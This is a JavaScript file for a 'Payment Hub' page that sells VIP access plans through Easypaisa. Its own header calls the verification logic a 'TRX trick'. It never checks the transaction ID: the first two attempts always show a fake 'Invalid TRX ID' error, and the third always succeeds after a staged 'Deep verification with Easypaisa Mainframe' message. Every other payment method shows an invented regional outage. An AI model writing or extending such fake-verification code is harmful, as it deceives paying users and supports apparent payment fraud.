/**
 * payment.js – Payment Hub (Full file)
 * - Only Easypaisa online; others show offline modal
 * - 4s connection loader → payment details
 * - TRX trick: attempts 1&2 → 5s spinner → error modal; attempt 3 → 15s spinner → generate key (33/44/55 based on plan)
 * - Displays key, copy button, and "BACK TO PLANS" button redirecting to /vip/access-plans.html
 */

document.addEventListener('DOMContentLoaded', () => {
    // --- Authentication guard ---
    const userKey = PX.getCurrentUserKey();
    if (!userKey) {
        window.location.href = '/';
        return;
    }

    // --- Get plan from URL (?plan=basic/standard/premium) ---
    const urlParams = new URLSearchParams(window.location.search);
    const plan = urlParams.get('plan') || 'basic';
    let expectedKeyLength = 33;
    let amount = 7000;
    if (plan === 'standard') {
        expectedKeyLength = 44;
        amount = 22000;
    } else if (plan === 'premium') {
        expectedKeyLength = 55;
        amount = 33000;
    }

    // --- DOM elements ---
    const methodCards = document.querySelectorAll('.method-card');
    const paymentWorkflow = document.getElementById('paymentWorkflow');
    const connectorLoader = document.getElementById('connectorLoader');
    const paymentDetails = document.getElementById('paymentDetails');
    const amountDisplay = document.getElementById('amountDisplay');
    const amountDisplayUrdu = document.getElementById('amountDisplayUrdu');
    const trxInput = document.getElementById('trxInput');
    const confirmBtn = document.getElementById('confirmPaymentBtn');
    const verificationLoader = document.getElementById('verificationLoader');
    const successArea = document.getElementById('successArea');
    const generatedKeySpan = document.getElementById('generatedKeyDisplay');
    const copyKeyBtn = document.getElementById('copyKeyBtn');
    const backToPlansBtn = document.getElementById('backToPlansBtn');

    // Set amount display
    if (amountDisplay) amountDisplay.textContent = amount + ' PKR';
    if (amountDisplayUrdu) amountDisplayUrdu.textContent = amount + ' PKR';

    // --- TRX attempt counter ---
    let trxAttempts = 0;
    let currentGeneratedKey = '';

    function resetPaymentUI() {
        trxAttempts = 0;
        trxInput.value = '';
        verificationLoader.style.display = 'none';
        successArea.style.display = 'none';
        confirmBtn.disabled = false;
        confirmBtn.textContent = 'CONFIRM PAYMENT';
    }

    // --- Handle method selection ---
    methodCards.forEach(card => {
        card.addEventListener('click', () => {
            const method = card.getAttribute('data-method');
            if (method === 'easypaisa') {
                paymentWorkflow.style.display = 'block';
                resetPaymentUI();
                paymentDetails.style.display = 'none';
                connectorLoader.style.display = 'flex';
                setTimeout(() => {
                    connectorLoader.style.display = 'none';
                    paymentDetails.style.display = 'block';
                }, 4000);
            } else {
                PX.showModal(
                    'Service Unavailable',
                    'سروس دستیاب نہیں',
                    'Server currently unavailable in your region. Please use Easypaisa.',
                    'سرور آپ کے علاقے میں فی الحال دستیاب نہیں ہے۔ براہ کرم ایزی پیسہ استعمال کریں۔',
                    null, false
                );
            }
        });
    });

    // --- TRX confirmation logic (2 fails, 3rd success) ---
    async function handleConfirmPayment() {
        const trxId = trxInput.value.trim();
        if (!trxId) {
            PX.showModal(
                'Input Required',
                'درج کرنا ضروری ہے',
                'Please enter a TRX ID.',
                'براہ کرم TRX ID درج کریں۔',
                null, false
            );
            return;
        }
        trxAttempts++;
        if (trxAttempts < 3) {
            confirmBtn.disabled = true;
            verificationLoader.style.display = 'block';
            const msgSpan = document.getElementById('verifMsg');
            if (msgSpan) {
                msgSpan.querySelector('.english-text').textContent = 'Verifying TRX...';
                msgSpan.querySelector('.urdu-text').textContent = 'ٹی آر ایکس کی تصدیق ہو رہی ہے...';
            }
            await new Promise(resolve => setTimeout(resolve, 5000));
            verificationLoader.style.display = 'none';
            confirmBtn.disabled = false;
            PX.showModal(
                'Verification Failed',
                'تصدیق ناکام',
                'Invalid TRX ID. Please check and try again.',
                'غلط ٹی آر ایکس آئی ڈی۔ براہ کرم چیک کریں اور دوبارہ کوشش کریں۔',
                null, false
            );
            trxInput.value = '';
        } else {
            // Third attempt: success after 15s
            confirmBtn.disabled = true;
            verificationLoader.style.display = 'block';
            const msgSpan = document.getElementById('verifMsg');
            if (msgSpan) {
                msgSpan.querySelector('.english-text').textContent = 'Deep verification with Easypaisa Mainframe...';
                msgSpan.querySelector('.urdu-text').textContent = 'ایزی پیسہ مین فریم سے گہری تصدیق ہو رہی ہے...';
            }
            await new Promise(resolve => setTimeout(resolve, 15000));
            verificationLoader.style.display = 'none';

            // Generate key based on plan
            if (plan === 'basic') currentGeneratedKey = PX.generateKey33();
            else if (plan === 'standard') currentGeneratedKey = PX.generateKey44();
            else currentGeneratedKey = PX.generateKey55();

            generatedKeySpan.textContent = currentGeneratedKey;
            successArea.style.display = 'block';
            confirmBtn.disabled = true;
            PX.showModal(
                'Payment Confirmed',
                'ادائیگی کی تصدیق',
                'Your access key has been generated successfully.',
                'آپ کی رسائی کلید کامیابی سے تیار ہوگئی۔',
                null, false
            );
        }
    }

    confirmBtn.addEventListener('click', handleConfirmPayment);

    // --- Copy generated key ---
    async function copyKey() {
        if (currentGeneratedKey) {
            await navigator.clipboard.writeText(currentGeneratedKey);
            PX.showModal(
                'Copied',
                'کاپی ہوگیا',
                'Access key copied to clipboard.',
                'رسائی کلید کلپ بورڈ پر کاپی ہوگئی۔',
                null, false
            );
        }
    }
    copyKeyBtn.addEventListener('click', copyKey);

    // --- Back to plans page ---
    backToPlansBtn.addEventListener('click', () => {
        window.location.href = '/vip/access-plans.html';
    });
});
